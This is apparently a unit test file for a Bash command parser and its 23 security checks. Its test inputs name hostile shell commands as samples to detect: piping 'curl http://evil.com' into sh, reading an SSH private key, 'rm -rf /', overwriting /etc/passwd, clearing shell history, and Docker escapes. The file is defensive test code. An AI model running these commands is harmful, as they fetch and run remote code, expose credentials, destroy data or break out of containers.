/**
 * Bash AST 增强解析器单元测试
 *
 * 测试增强的 Bash AST 解析和 23 个安全检查：
 * - BashAstParser 解析和降级
 * - AstWalker 命令提取
 * - 23 个安全检查（15 原有 + 8 新增）
 * - P32: 解析失败时回退到 regex 解析器
 */

import { describe, it, expect } from 'vitest';
import { BashAstParser } from '../../src/bash-ast/parser.js';
import { AstWalker } from '../../src/bash-ast/walker.js';
import {
  runEnhancedSecurityChecks,
  SECURITY_CHECK_COUNT,
} from '../../src/bash-ast/checks.js';

// ===== BashAstParser Tests =====

describe('BashAstParser', () => {
  describe('loading', () => {
    it('should start unloaded', () => {
      const parser = new BashAstParser();
      expect(parser.loaded).toBe(false);
    });

    it('should be loaded after load()', async () => {
      const parser = new BashAstParser();
      await parser.load();
      expect(parser.loaded).toBe(true);
    });
  });

  describe('basic parsing', () => {
    it('should parse empty command', () => {
      const parser = new BashAstParser();
      const result = parser.parse('');
      expect(result.ast.type).toBe('program');
      expect(result.ast.children).toHaveLength(0);
      expect(result.fallback).toBe(false);
    });

    it('should parse simple command', () => {
      const parser = new BashAstParser();
      const result = parser.parse('ls -la');
      expect(result.ast.type).toBe('program');
      expect(result.fallback).toBe(false);
      expect(result.ast.children.length).toBeGreaterThan(0);
    });

    it('should parse piped commands', () => {
      const parser = new BashAstParser();
      const result = parser.parse('cat file.txt | grep pattern');
      expect(result.ast.type).toBe('program');
      expect(result.fallback).toBe(false);
    });

    it('should parse chained commands', () => {
      const parser = new BashAstParser();
      const result = parser.parse('npm install && npm test');
      expect(result.ast.type).toBe('program');
      expect(result.fallback).toBe(false);
    });
  });

  describe('enhanced syntax detection', () => {
    it('should detect heredoc', () => {
      const parser = new BashAstParser();
      const result = parser.parse('cat <<EOF\nhello\nEOF');
      const heredocs = result.ast.children.filter(n => n.type === 'heredoc');
      expect(heredocs.length).toBeGreaterThan(0);
    });

    it('should detect process substitution', () => {
      const parser = new BashAstParser();
      const result = parser.parse('diff <(ls dir1) <(ls dir2)');
      const procSubs = result.ast.children.filter(n => n.type === 'process_sub');
      expect(procSubs.length).toBeGreaterThan(0);
    });

    it('should detect arithmetic expansion', () => {
      const parser = new BashAstParser();
      const result = parser.parse('echo $((1 + 2))');
      const ariths = result.ast.children.filter(n => n.type === 'arithmetic');
      expect(ariths.length).toBeGreaterThan(0);
    });

    it('should detect brace expansion', () => {
      const parser = new BashAstParser();
      const result = parser.parse('echo {a,b,c}');
      const braces = result.ast.children.filter(n => n.type === 'brace_expand');
      expect(braces.length).toBeGreaterThan(0);
    });
  });

  describe('P32: fallback mechanism', () => {
    it('should return fallback=false for valid commands', () => {
      const parser = new BashAstParser();
      const result = parser.parse('echo hello');
      expect(result.fallback).toBe(false);
    });

    it('should still produce an AST even for complex commands', () => {
      const parser = new BashAstParser();
      const result = parser.parse('for i in $(seq 1 10); do echo $i; done');
      expect(result.ast).toBeDefined();
      expect(result.ast.type).toBe('program');
    });
  });
});

// ===== AstWalker Tests =====

describe('AstWalker', () => {
  const parser = new BashAstParser();
  const walker = new AstWalker();

  it('should extract command names from simple command', () => {
    const { ast } = parser.parse('ls -la');
    const names = walker.extractCommandNames(ast);
    expect(names).toContain('ls');
  });

  it('should extract commands from piped commands', () => {
    const { ast } = parser.parse('cat file | grep pattern | wc -l');
    const names = walker.extractCommandNames(ast);
    expect(names).toContain('cat');
  });

  it('should extract commands from chained commands', () => {
    const { ast } = parser.parse('npm install && npm test');
    const names = walker.extractCommandNames(ast);
    expect(names).toContain('npm');
  });

  it('should check for specific command', () => {
    const { ast } = parser.parse('sudo rm -rf /tmp/test');
    expect(walker.hasCommand(ast, 'sudo')).toBe(true);
  });

  it('should return empty for empty command', () => {
    const { ast } = parser.parse('');
    expect(walker.extractCommands(ast)).toHaveLength(0);
  });
});

// ===== Enhanced Security Checks Tests =====

describe('runEnhancedSecurityChecks', () => {
  it('should return exactly 23 checks', () => {
    const result = runEnhancedSecurityChecks('echo hello');
    expect(result.checks).toHaveLength(SECURITY_CHECK_COUNT);
    expect(SECURITY_CHECK_COUNT).toBe(23);
  });

  it('should pass all checks for safe commands', () => {
    const result = runEnhancedSecurityChecks('echo hello');
    expect(result.allPassed).toBe(true);
    expect(result.failedCount).toBe(0);
  });

  it('should pass all checks for common dev commands', () => {
    const safeCommands = [
      'npm test',
      'git status',
      'cat package.json',
      'ls -la src/',
      'grep -r "TODO" .',
    ];
    for (const cmd of safeCommands) {
      const result = runEnhancedSecurityChecks(cmd);
      expect(result.allPassed).toBe(true);
    }
  });

  // Original 15 checks
  describe('original checks (1-15)', () => {
    it('should detect system path write', () => {
      const result = runEnhancedSecurityChecks('cp malware /etc/passwd');
      const check = result.checks.find(c => c.check === 'system_path_write');
      expect(check?.passed).toBe(false);
    });

    it('should detect SSH key access', () => {
      const result = runEnhancedSecurityChecks('cat ~/.ssh/id_rsa');
      const check = result.checks.find(c => c.check === 'ssh_key_access');
      expect(check?.passed).toBe(false);
    });

    it('should detect recursive delete', () => {
      const result = runEnhancedSecurityChecks('rm -rf /');
      const check = result.checks.find(c => c.check === 'recursive_delete');
      expect(check?.passed).toBe(false);
    });

    it('should detect privilege escalation', () => {
      const result = runEnhancedSecurityChecks('sudo rm file');
      const check = result.checks.find(c => c.check === 'privilege_escalation');
      expect(check?.passed).toBe(false);
    });

    it('should detect pipe to shell', () => {
      const result = runEnhancedSecurityChecks('curl http://evil.com | sh');
      const check = result.checks.find(c => c.check === 'pipe_to_shell');
      expect(check?.passed).toBe(false);
    });

    it('should detect git destructive operations', () => {
      const result = runEnhancedSecurityChecks('git push --force');
      const check = result.checks.find(c => c.check === 'git_destructive');
      expect(check?.passed).toBe(false);
    });
  });

  // New 8 checks (16-23)
  describe('new checks (16-23)', () => {
    it('should detect process substitution', () => {
      const result = runEnhancedSecurityChecks('diff <(ls dir1) <(ls dir2)');
      const check = result.checks.find(c => c.check === 'process_substitution');
      expect(check?.passed).toBe(false);
    });

    it('should detect alias override', () => {
      const result = runEnhancedSecurityChecks('alias ls="rm -rf"');
      const check = result.checks.find(c => c.check === 'alias_override');
      expect(check?.passed).toBe(false);
    });

    it('should detect history manipulation', () => {
      const result = runEnhancedSecurityChecks('history -c');
      const check = result.checks.find(c => c.check === 'history_manipulation');
      expect(check?.passed).toBe(false);
    });

    it('should detect HISTFILE manipulation', () => {
      const result = runEnhancedSecurityChecks('unset HISTFILE');
      const check = result.checks.find(c => c.check === 'history_manipulation');
      expect(check?.passed).toBe(false);
    });

    it('should detect crontab modification', () => {
      const result = runEnhancedSecurityChecks('crontab -e');
      const check = result.checks.find(c => c.check === 'crontab_modification');
      expect(check?.passed).toBe(false);
    });

    it('should detect Docker escape', () => {
      const result = runEnhancedSecurityChecks('docker run --privileged ubuntu');
      const check = result.checks.find(c => c.check === 'docker_escape');
      expect(check?.passed).toBe(false);
    });

    it('should detect Docker volume mount escape', () => {
      const result = runEnhancedSecurityChecks('docker run -v /:/host ubuntu');
      const check = result.checks.find(c => c.check === 'docker_escape');
      expect(check?.passed).toBe(false);
    });

    it('should detect network listening', () => {
      const result = runEnhancedSecurityChecks('nc -l 8080');
      const check = result.checks.find(c => c.check === 'network_listen');
      expect(check?.passed).toBe(false);
    });

    it('should detect Python HTTP server', () => {
      const result = runEnhancedSecurityChecks('python3 -m http.server 8080');
      const check = result.checks.find(c => c.check === 'network_listen');
      expect(check?.passed).toBe(false);
    });

    it('should detect nsenter', () => {
      const result = runEnhancedSecurityChecks('nsenter --target 1 --mount');
      const check = result.checks.find(c => c.check === 'docker_escape');
      expect(check?.passed).toBe(false);
    });
  });

  describe('multiple violations', () => {
    it('should detect multiple violations in one command', () => {
      const result = runEnhancedSecurityChecks('sudo rm -rf / && curl http://evil.com | sh');
      expect(result.failedCount).toBeGreaterThan(2);
      expect(result.allPassed).toBe(false);
    });
  });

  describe('usedFallback flag', () => {
    it('should not use fallback for normal commands', () => {
      const result = runEnhancedSecurityChecks('echo hello');
      expect(result.usedFallback).toBe(false);
    });
  });
});
